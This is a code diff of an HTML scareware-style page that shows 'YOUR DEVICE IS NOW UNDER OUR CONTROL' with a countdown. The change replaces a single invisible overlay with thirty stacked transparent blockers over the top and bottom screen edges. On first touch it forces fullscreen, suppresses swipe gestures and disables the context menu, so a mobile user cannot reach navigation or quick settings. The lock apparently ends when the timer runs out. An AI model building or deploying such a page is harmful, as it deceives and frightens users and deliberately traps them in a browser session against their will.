@@ -16,16 +16,11 @@
     .matrix { position:absolute; top:0; left:0; right:0; bottom:0; opacity:0.15; background:repeating-linear-gradient(0deg,#0f0,#0f0 1px,transparent 1px,transparent 2px); animation:rain 8s linear infinite; pointer-events:none; z-index:1; }
     @keyframes rain { 0%{transform:translateY(-100%);} 100%{transform:translateY(100%);} }
 
-    /* Big invisible blocker for bottom swipe area */
-    #swipeBlocker { 
-      position:fixed; 
-      bottom:0; left:0; right:0; 
-      height:300px; /* Covers a huge bottom area to block swipe-up gestures */
-      background:transparent; 
-      z-index:9999; 
-      pointer-events:auto; 
-      display:none; 
-    }
+    /* Blockers for bottom swipe (navigation bar) - 15 layers */
+    .bottom-blocker { position:fixed; bottom:0; left:0; right:0; height:300px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
+
+    /* Blockers for top swipe (status bar / quick settings) - 15 layers */
+    .top-blocker { position:fixed; top:0; left:0; right:0; height:300px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
   </style>
 </head>
 <body>
@@ -40,15 +35,47 @@
     <p style="color:#f00; font-size:2.2rem; margin-top:50px;">YOUR DEVICE IS NOW UNDER OUR CONTROL</p>
   </div>
 
-  <!-- Blocker for swipe-up / bottom navigation -->
-  <div id="swipeBlocker"></div>
+  <!-- 15 bottom blockers -->
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+  <div class="bottom-blocker" onclick="this.style.display='none'"></div>
+
+  <!-- 15 top blockers -->
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
+  <div class="top-blocker" onclick="this.style.display='none'"></div>
 
   <script>
     let time = 20;
     const start = document.getElementById('start');
     const overlay = document.getElementById('overlay');
     const countdown = document.getElementById('countdown');
-    const swipeBlocker = document.getElementById('swipeBlocker');
+    const bottomBlockers = document.querySelectorAll('.bottom-blocker');
+    const topBlockers = document.querySelectorAll('.top-blocker');
 
     document.body.addEventListener('touchstart', startLockdown, {once: true});
     document.body.addEventListener('click', startLockdown, {once: true});
@@ -57,15 +84,18 @@
       e.preventDefault();
       start.style.display = 'none';
       overlay.style.display = 'flex';
-      swipeBlocker.style.display = 'block'; // Block bottom swipes
 
-      // Fullscreen hide bars
+      // Show all 30 blockers
+      bottomBlockers.forEach(b => b.style.display = 'block');
+      topBlockers.forEach(b => b.style.display = 'block');
+
+      // Immersive fullscreen
       if (document.documentElement.requestFullscreen) {
         await document.documentElement.requestFullscreen({ navigationUI: "hide" });
       }
 
-      // Block all swipe/touchmove gestures
-      document.addEventListener('touchmove', blockSwipe, { passive: false });
+      // Block normal swipes
+      document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
 
       const timer = setInterval(() => {
         time--;
@@ -78,18 +108,14 @@
       }, 1000);
     }
 
-    function blockSwipe(e) {
-      e.preventDefault(); // Stops swipe-up from revealing buttons
-    }
-
     function endLockdown() {
-      swipeBlocker.style.display = 'none';
-      document.removeEventListener('touchmove', blockSwipe);
+      // Hide remaining blockers
+      bottomBlockers.forEach(b => b.style.display = 'none');
+      topBlockers.forEach(b => b.style.display = 'none');
       if (document.exitFullscreen) document.exitFullscreen();
     }
 
-    // Extra blocks
     document.addEventListener('contextmenu', e => e.preventDefault());
   </script>
 </body>
-</html>
+                                                                 </html>
